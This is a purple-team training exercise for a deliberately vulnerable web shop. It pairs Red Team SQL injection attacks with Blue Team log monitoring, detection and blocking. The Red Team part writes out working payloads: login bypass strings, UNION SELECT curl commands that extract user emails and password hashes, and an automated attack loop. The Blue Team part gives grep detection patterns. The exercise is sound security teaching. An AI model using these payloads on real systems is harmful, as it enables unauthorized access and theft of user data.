# Purple Team Exercise 01: SQL Injection Attack & Defense

## 🎯 Overview

**Duration:** 40 minutes  
**Difficulty:** ⭐ Beginner  
**OWASP Category:** A03:2021 - Injection

In this exercise, the Red Team will perform SQL injection attacks while the Blue Team simultaneously monitors, detects, and responds to the attacks in real-time.

---

## ⏱️ Timeline

| Time | Red Team Activity | Blue Team Activity |
|------|-------------------|-------------------|
| 0-5 min | Setup & reconnaissance | Setup monitoring & baseline |
| 5-20 min | SQL injection attacks | Real-time detection |
| 20-30 min | Continue exploitation | Create blocking rules |
| 30-40 min | Document findings | Block attacker & report |

---

## 🔴 Red Team Instructions

### Target
```
Direct:  http://<VPS_IP>:8080  (faster, less logging)
Proxied: http://<VPS_IP>:8080  (logs visible to Blue Team)
```

> **For this exercise:** Use port **8080** so Blue Team can detect your attacks in their logs!

### Phase 1: Reconnaissance (5 minutes)

**Objective:** Identify potential SQL injection points

1. Browse the application and identify input fields
2. Find the login page and search functionality
3. Note all endpoints that accept user input

**Key Endpoints to Test:**
- `/rest/user/login` - Login form (POST with JSON)
- `/rest/products/search?q=` - Search functionality (GET)

---

### Phase 2: SQL Injection Attacks (15 minutes)

**Objective:** Exploit SQL injection vulnerabilities

#### Attack 1: Authentication Bypass

1. Navigate to: `http://<VPS_IP>:8080/#/login`
2. In the email field, try these payloads:

```sql
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
admin@juice-sh.op'--
```

3. Enter any password and click login
4. **Expected Result:** Login as admin without password

#### Attack 2: Search-Based SQL Injection

1. Use the search functionality
2. Try these payloads in the search box or URL:

```bash
# Basic test
curl "http://<VPS_IP>:8080/rest/products/search?q=test"

# SQL injection test
curl "http://<VPS_IP>:8080/rest/products/search?q='))--"

# Data extraction
curl "http://<VPS_IP>:8080/rest/products/search?q='))UNION+SELECT+1,2,3,4,5,6,7,8,9--"
```

#### Attack 3: Extract User Data

```bash
# Extract user emails and password hashes
curl "http://<VPS_IP>:8080/rest/products/search?q='))UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users--"
```

---

### Phase 3: Continue & Escalate (10 minutes)

Keep attacking to generate more logs for Blue Team detection:

```bash
# Automated attack script
for payload in "' OR 1=1--" "' UNION SELECT" "'; DROP TABLE" "admin'--"; do
    curl -s "http://<VPS_IP>:8080/rest/products/search?q=$payload" > /dev/null
    sleep 1
done
```

**Note:** If you get blocked, document when and how. This means Blue Team is doing their job!

---

### Red Team Deliverables

Document in your notes:
- [ ] Successful login bypass payload
- [ ] Data extracted (emails, hashes)
- [ ] Time you got blocked (if applicable)
- [ ] Total vulnerabilities found

---

## 🔵 Blue Team Instructions

### Phase 1: Setup Monitoring (5 minutes)

**Objective:** Establish baseline and monitoring

#### SSH Access to Blue Team Server

Blue Team has SSH access to a dedicated monitoring server with access to all logs:

```bash
# SSH to Blue Team server (password: defend123)
ssh blueteam@<VPS_IP> -p 2222
```

> **Credentials:**
> - **Username:** `blueteam`
> - **Password:** `defend123`
> - **Port:** `2222`

#### 1. Connect and Start Watching

```bash
# SSH into Blue Team server
ssh blueteam@<VPS_IP> -p 2222

# Run the helper script to see available commands
~/scripts/help.sh

# Real-time log monitoring
tail -f /var/log/nginx/access.log
```

#### 2. In a Second Terminal - Filter for Attacks

```bash
# SSH in another terminal
ssh blueteam@<VPS_IP> -p 2222

# Watch only for SQL injection patterns
tail -f /var/log/nginx/access.log | grep -iE "(union|select|or.*=|'--|%27)"

# Or use the detection script
~/scripts/detect-sqli.sh
```

#### 3. Access Kibana (Optional)
```
http://<VPS_IP>:5601
```
- Go to **Discover**
- Create index pattern: `filebeat-*`
- Set time field: `@timestamp`

---

### Phase 2: Real-Time Detection (15 minutes)

**Objective:** Detect SQL injection attacks as they happen

#### Detection via SSH (on Blue Team Server)

```bash
# Get all logs and search for SQL patterns
grep -iE "(union|select|or.1=1|'--|%27)" /var/log/nginx/access.log

# Count SQL injection attempts
grep -ciE "(union|select|or.1=1)" /var/log/nginx/access.log

# Find attacker IPs (first field in log)
grep -iE "(union|select|or.1=1)" /var/log/nginx/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn

# Watch for successful attacks (200 status)
grep -iE "(union|select)" /var/log/nginx/access.log | grep '" 200 '

# Or use the built-in detection script
~/scripts/detect-sqli.sh
```

#### Kibana Detection Queries

```
# SQL Injection patterns
message:*UNION* OR message:*SELECT* OR message:*OR*1=1*
```

#### What to Look For

| Pattern | Indicates |
|---------|-----------|
| `' OR '1'='1` | Auth bypass attempt |
| `UNION SELECT` | Data extraction |
| `'--` or `#` | SQL comment injection |
| Many 401s then 200 | Successful bypass |

---

### Phase 3: Create Blocking Rules (10 minutes)

**Objective:** Block the attacker

#### 1. Identify Attacker IP

```bash
# Find the most active attacker from logs
grep -iE "(union|select|or.1=1)" /var/log/nginx/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn | head -5

# Or use the helper script
~/scripts/show-attackers.sh
```

#### 2. Report the IP for Blocking

Blue Team documents the attacker IP and reports to the instructor/admin for blocking.

```bash
# Record attacker IP for blocking
ATTACKER_IP=$(grep -iE "(union|select)" /var/log/nginx/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')

echo "Attacker IP to block: $ATTACKER_IP"
echo "$ATTACKER_IP" >> ~/blocked_ips.txt
```

> **Note:** In a real scenario, you would report this to the network team or use a WAF console to block the IP.

#### 3. Verify Attack Stopped
```bash
# Check if requests from attacker continue
tail -f /var/log/nginx/access.log | grep "$ATTACKER_IP"
```

---

### Phase 4: Document & Report (10 minutes)

Create an incident summary:

```
INCIDENT SUMMARY
================
Date: [DATE]
Duration: [START] - [END]

Attacker IP: [IP]
Attack Type: SQL Injection

Attacks Detected:
- Authentication bypass attempts: [COUNT]
- Data extraction attempts: [COUNT]
- Successful extractions: [COUNT]

Data Potentially Exposed:
- User emails: [YES/NO]
- Password hashes: [YES/NO]

Response Actions:
- [TIME] - Attack detected
- [TIME] - IP blocked
- [TIME] - Attack stopped

Recommendations:
1. Implement parameterized queries
2. Add Web Application Firewall
3. Rate limit login attempts
```

---

## 🟣 Debrief Questions

Discuss as a team:

1. **Red Team:** What payloads worked? What didn't?
2. **Blue Team:** How quickly did you detect the attack?
3. **Both:** What could improve detection/prevention?
4. **Both:** What real-world impact could this attack have?

---

## ✅ Success Criteria

### Red Team
- [ ] Successfully logged in via SQL injection
- [ ] Extracted at least one user's data
- [ ] Documented attack methodology

### Blue Team
- [ ] Detected SQL injection within 5 minutes
- [ ] Identified correct attacker IP
- [ ] Successfully blocked attacker
- [ ] Created incident summary
